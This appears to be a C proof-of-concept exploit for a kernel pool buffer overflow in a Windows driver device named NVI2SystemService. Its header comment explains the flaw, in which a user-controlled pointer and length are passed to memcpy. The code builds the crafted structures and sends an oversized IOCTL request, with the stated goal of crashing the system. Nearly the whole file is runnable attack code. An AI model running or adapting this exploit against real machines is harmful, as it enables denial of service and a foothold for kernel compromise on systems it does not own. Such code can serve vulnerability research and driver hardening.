// Compiled with Visual Studio 20022 console compiler:
// 1. Initiate environment: "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// 2. Compile: cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc test_ioctl_short.c /link /OUT:test_ioctl.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define IOCTL_TEST 0x22e008

/*
VULNERABILITY: Kernel pool buffer overflow in memcpy

The IOCTL 0x22e008 handler validates:
- InputBufferLength == 8 bytes  
- OutputBufferLength == 0x414 bytes

Then reads structure pointer from SystemBuffer[0] and does:
  memcpy(SystemBuffer + 0x208, *struct_ptr->source_ptr, struct_ptr->length)

Where struct_ptr->source_ptr and struct_ptr->length are user-controlled!

Exploitation:
1. SystemBuffer[0] points to controlled user-mode structure
2. Structure at offset 0x30 (0x60 bytes) contains source pointer
3. Structure at offset 0x2C (0x58 bytes) contains length (ushort, max 0xFFFF)
4. Available space at offset 0x208: only 0x20C bytes (0x414 - 0x208)
5. Setting length > 0x20C causes kernel pool overflow!
*/

// Structure that will be pointed to from SystemBuffer[0]
typedef struct {
    short type;                    // Offset 0x0: must be 5
    char padding1[6];
    void* object_ptr;              // Offset 0x8: points to another structure with value 3 at offset 0
    char padding2[0x48];           // Pad to offset 0x58
    unsigned short copy_length;    // Offset 0x58 (0x2C in shorts): user-controlled length
    char padding3[6];
    void* source_buffer;           // Offset 0x60 (0x30 in shorts): user-controlled source pointer
} EXPLOIT_STRUCT;

// Object structure (pointed to by object_ptr)
typedef struct {
    short object_type;             // Offset 0x0: must be 3
    char padding[0x46];
    unsigned int some_value;       // Offset 0x48 (0x24 in ints): gets copied to output
} OBJECT_STRUCT;

int main(int argc, char *argv[])
{
    WCHAR devicePath[260];
    HANDLE hDevice;
    DWORD bytesReturned;
    BOOL result;
    
    // Input buffer: 8 bytes (pointer to our exploit structure)
    unsigned char in_buff[8];
    
    // Output buffer: must be exactly 0x414 bytes
    unsigned char out_buff[0x414];
    
    // Allocate our controlled structures in user-mode
    EXPLOIT_STRUCT* exploit_struct = (EXPLOIT_STRUCT*)malloc(sizeof(EXPLOIT_STRUCT));
    OBJECT_STRUCT* object_struct = (OBJECT_STRUCT*)malloc(sizeof(OBJECT_STRUCT));
    
    // Large buffer to overflow into kernel pool
    unsigned char* overflow_data = (unsigned char*)malloc(0x2000);
    
    memset(exploit_struct, 0, sizeof(EXPLOIT_STRUCT));
    memset(object_struct, 0, sizeof(OBJECT_STRUCT));
    memset(overflow_data, 0x41, 0x2000);  // Fill with 'A's
    memset(in_buff, 0, sizeof(in_buff));
    memset(out_buff, 0, sizeof(out_buff));
    
    // Setup object structure
    object_struct->object_type = 3;       // Must be 3
    object_struct->some_value = 0x12345678; // This is arbitraty
    
    // Setup exploit structure  
    exploit_struct->type = 5;                          // Required value
    exploit_struct->object_ptr = object_struct;        // Points to object with type=3
    exploit_struct->source_buffer = overflow_data;     // Source for memcpy
    exploit_struct->copy_length = 0x1000;              // OVERFLOW! (only 0x20C bytes available)
    
    // Input buffer contains pointer to exploit structure
    *(EXPLOIT_STRUCT**)in_buff = exploit_struct;
    
    printf("=== Kernel Pool Overflow PoC ===\n");
    printf("Exploit structure: %p\n", exploit_struct);
    printf("Object structure: %p\n", object_struct);
    printf("Overflow buffer: %p\n", overflow_data);
    printf("Copy length: 0x%X (available: 0x20C)\n", exploit_struct->copy_length);
    printf("Overflow amount: 0x%X bytes\n\n", exploit_struct->copy_length - 0x20C);
    
    swprintf(devicePath, 260, L"\\\\.\\NVI2SystemService");
    printf("Device path: %S\n", devicePath);
    
    hDevice = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE, 
                         FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, 
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device %S: %d\n", devicePath, GetLastError());
        free(exploit_struct);
        free(object_struct);
        free(overflow_data);
        return 1;
    }
    printf("Device opened successfully\n\n");
    
    printf("WARNING: This will overflow kernel pool memory!\n");
    printf("Expected: BSOD (system crash)\n");
    printf("Press Enter to trigger exploit...\n");
    getchar();
    
    printf("Sending IOCTL 0x%X\n", IOCTL_TEST);
    printf("  InputBufferLength: 0x8\n");
    printf("  OutputBufferLength: 0x414\n\n");
    
    result = DeviceIoControl(hDevice, IOCTL_TEST, 
                            in_buff, sizeof(in_buff),      // Input: 8 bytes
                            out_buff, sizeof(out_buff),    // Output: 0x414 bytes
                            &bytesReturned, NULL);
    
    if (!result) {
        printf("DeviceIoControl failed: %d\n", GetLastError());
    } else {
        printf("IOCTL succeeded, bytes returned: %d\n", bytesReturned);
        printf("If you see this, the overflow happened but didn't crash (yet)!\n");
    }
    
    CloseHandle(hDevice);
    free(exploit_struct);
    free(object_struct);
    free(overflow_data);
    
    return result ? 0 : 1;
}
